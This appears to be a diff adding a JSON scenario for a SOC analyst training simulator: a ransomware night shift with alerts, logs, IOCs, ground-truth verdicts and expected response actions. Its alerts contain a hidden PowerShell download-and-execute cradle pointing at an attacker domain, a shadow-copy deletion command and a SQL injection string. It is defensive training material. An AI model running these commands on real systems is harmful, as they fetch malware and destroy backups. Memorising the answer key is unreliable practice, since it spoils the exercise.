@@ -1,0 +1,337 @@
+{
+  "id": "sc-067",
+  "title": "Shift 067 - Night Shift",
+  "category": "Ransomware",
+  "outcome": "mixed",
+  "difficulty": "Tier 3",
+  "briefing": "Busy shift: alerts are arriving from several sources. Judge each one on its own evidence.",
+  "startTime": "02:30:00",
+  "context": {
+    "change_calendar": [],
+    "notices": [
+      "Authorized external penetration test by BlueShield Labs: source 198.51.100.38, scope WEB-01, ticket PT-154.",
+      "HR notice: Tarek Hassan returned from annual leave today."
+    ]
+  },
+  "assets": {
+    "users": {
+      "s.zaki": "FS-01",
+      "t.hassan": "HR-PC-25"
+    }
+  },
+  "alerts": [
+    {
+      "at": 0,
+      "severity": "Medium",
+      "rule": "Email: macro-enabled attachment",
+      "source": "Email Gateway",
+      "host": "FIN-PC-03",
+      "user": "s.zaki",
+      "summary": "Macro-enabled attachment Invoice_Q3.docm delivered to s.zaki",
+      "details": {
+        "email_from": "billing@sso-service-team.info",
+        "email_to": "s.zaki@corp.example",
+        "file_name": "Invoice_Q3.docm",
+        "file_hash": "aac972279de960cefe1eb07e5640f46254008a590db1736c1c620d637351a019",
+        "action_taken": "Delivered",
+        "raw_log": "mail attach=Invoice_Q3.docm macro=yes spf=fail"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "High",
+        "escalate": true,
+        "mitre": "T1566.001"
+      },
+      "id": "A-1001"
+    },
+    {
+      "at": 5,
+      "severity": "High",
+      "rule": "EDR: PowerShell download cradle",
+      "source": "EDR",
+      "host": "FIN-PC-03",
+      "user": "s.zaki",
+      "summary": "powershell.exe downloaded a payload from sso-service-team.info on FIN-PC-03",
+      "details": {
+        "host_ip": "10.12.183.245",
+        "process": "powershell.exe",
+        "parent_process": "WINWORD.EXE",
+        "domain": "sso-service-team.info",
+        "command_line": "powershell -w hidden -c IEX((New-Object Net.WebClient).DownloadString('https://sso-service-team.info/a.ps1'))",
+        "raw_log": "EDR proc=powershell.exe parent=WINWORD.EXE net=https://sso-service-team.info/a.ps1"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "High",
+        "escalate": true,
+        "mitre": "T1059.001"
+      },
+      "id": "A-1002"
+    },
+    {
+      "at": 5,
+      "severity": "High",
+      "rule": "WAF: SQL injection attempts",
+      "source": "WAF",
+      "host": "WEB-01",
+      "user": "n/a",
+      "summary": "430 SQL injection payloads from 198.51.100.38 against /search within 5 minutes",
+      "details": {
+        "src_ip": "198.51.100.38",
+        "dst_ip": "172.16.10.5",
+        "dst_port": 443,
+        "protocol": "HTTPS",
+        "count": 430,
+        "url": "https://www.corp.example/search?q=' OR 1=1--",
+        "action_taken": "Blocked",
+        "raw_log": "waf rule=942100 action=block src=198.51.100.38 uri=/search?q=%27%20OR%201%3D1-- count=430"
+      },
+      "truth": {
+        "verdict": "FP",
+        "severity": "Low",
+        "escalate": false,
+        "mitre": null
+      },
+      "id": "A-1003"
+    },
+    {
+      "at": 8,
+      "severity": "Low",
+      "rule": "Multiple failed logons",
+      "source": "Windows Security",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "summary": "8 failed logons (4625) within 3 minutes followed by a successful logon (4624)",
+      "details": {
+        "src_ip": "10.11.25.43",
+        "host_ip": "10.11.25.43",
+        "event_id": 4625,
+        "count": 8,
+        "logon_type": "Interactive (2)",
+        "raw_log": "4625 x8 Account=t.hassan Status=0xC000006A (bad password); then 4624 success"
+      },
+      "truth": {
+        "verdict": "FP",
+        "severity": "Low",
+        "escalate": false,
+        "mitre": null
+      },
+      "id": "A-1004"
+    },
+    {
+      "at": 12,
+      "severity": "Critical",
+      "rule": "EDR: shadow copies deleted",
+      "source": "EDR",
+      "host": "FIN-PC-03",
+      "user": "s.zaki",
+      "summary": "vssadmin delete shadows /all executed on FIN-PC-03",
+      "details": {
+        "host_ip": "10.12.183.245",
+        "process": "vssadmin.exe",
+        "parent_process": "powershell.exe",
+        "command_line": "vssadmin.exe delete shadows /all /quiet",
+        "raw_log": "EDR proc=vssadmin.exe args='delete shadows /all /quiet' host=FIN-PC-03"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Critical",
+        "escalate": true,
+        "mitre": "T1490"
+      },
+      "id": "A-1005"
+    },
+    {
+      "at": 15,
+      "severity": "Critical",
+      "rule": "File server: mass file rename / entropy spike",
+      "source": "File Server",
+      "host": "FS-01",
+      "user": "s.zaki",
+      "summary": "4055 files renamed with extension .crimsonlock on FS-01 within 3 minutes",
+      "details": {
+        "src_ip": "10.12.183.245",
+        "dst_ip": "10.10.0.20",
+        "protocol": "SMB",
+        "file_name": "README_CrimsonLock.txt",
+        "raw_log": "fs rename burst share=\\\\FS-01\\Finance ext=.crimsonlock user=s.zaki"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Critical",
+        "escalate": true,
+        "mitre": "T1486"
+      },
+      "id": "A-1006"
+    }
+  ],
+  "logs": [
+    {
+      "t": "02:25:43",
+      "src": "windows",
+      "host": "EXEC-PC-26",
+      "user": "y.saleh",
+      "msg": "4624 logon type 2 (interactive) success"
+    },
+    {
+      "t": "02:27:00",
+      "src": "windows",
+      "host": "EXEC-PC-28",
+      "user": "k.gamal",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "02:33:47",
+      "src": "windows",
+      "host": "SALES-PC-33",
+      "user": "k.mansour",
+      "msg": "4624 logon type 2 (interactive) success"
+    },
+    {
+      "t": "02:35:00",
+      "src": "proxy",
+      "host": "FIN-PC-03",
+      "user": "s.zaki",
+      "msg": "GET https://sso-service-team.info/a.ps1 200"
+    },
+    {
+      "t": "02:35:00",
+      "src": "waf",
+      "host": "WEB-01",
+      "user": "n/a",
+      "msg": "BLOCK 198.51.100.38 GET /search?q=' OR 1=1-- rule=942100"
+    },
+    {
+      "t": "02:35:00",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 1"
+    },
+    {
+      "t": "02:35:20",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 2"
+    },
+    {
+      "t": "02:35:38",
+      "src": "email",
+      "host": "IT-PC-39",
+      "user": "s.fathy",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "02:35:40",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 3"
+    },
+    {
+      "t": "02:36:00",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 4"
+    },
+    {
+      "t": "02:36:20",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 5"
+    },
+    {
+      "t": "02:36:40",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 6"
+    },
+    {
+      "t": "02:37:00",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 7"
+    },
+    {
+      "t": "02:37:20",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4625 failed logon (bad password) attempt 8"
+    },
+    {
+      "t": "02:37:55",
+      "src": "windows",
+      "host": "HR-PC-25",
+      "user": "t.hassan",
+      "msg": "4624 successful logon (interactive)"
+    },
+    {
+      "t": "02:39:29",
+      "src": "email",
+      "host": "ENG-PC-26",
+      "user": "n.zaki",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "02:40:42",
+      "src": "email",
+      "host": "IT-PC-05",
+      "user": "r.zaki",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "02:42:45",
+      "src": "proxy",
+      "host": "SALES-PC-16",
+      "user": "y.fathy",
+      "msg": "GET https://intranet.corp.example/home 200"
+    },
+    {
+      "t": "02:45:00",
+      "src": "windows",
+      "host": "FS-01",
+      "user": "s.zaki",
+      "msg": "5145 share access \\\\FS-01\\Finance by s.zaki (write, burst)"
+    },
+    {
+      "t": "02:47:39",
+      "src": "windows",
+      "host": "SALES-PC-37",
+      "user": "h.adel",
+      "msg": "4624 logon type 2 (interactive) success"
+    }
+  ],
+  "iocs": {
+    "sso-service-team.info": {
+      "type": "domain",
+      "reputation": "malicious",
+      "note": "Ransomware loader hosting"
+    },
+    "aac972279de960cefe1eb07e5640f46254008a590db1736c1c620d637351a019": {
+      "type": "hash",
+      "reputation": "malicious",
+      "note": "CrimsonLock dropper document"
+    },
+    "198.51.100.38": {
+      "type": "ip",
+      "reputation": "clean",
+      "note": "Registered penetration-test source (BlueShield Labs)"
+    }
+  },
+  "expected_actions": [
+    "isolate_host:FIN-PC-03",
+    "isolate_host:FS-01",
+    "disable_account:s.zaki",
+    "block_domain:sso-service-team.info",
+    "escalate_tier2",
+    "initiate_incident_response",
+    "close_false_positive",
+    "close_false_positive"
+  ]
+}
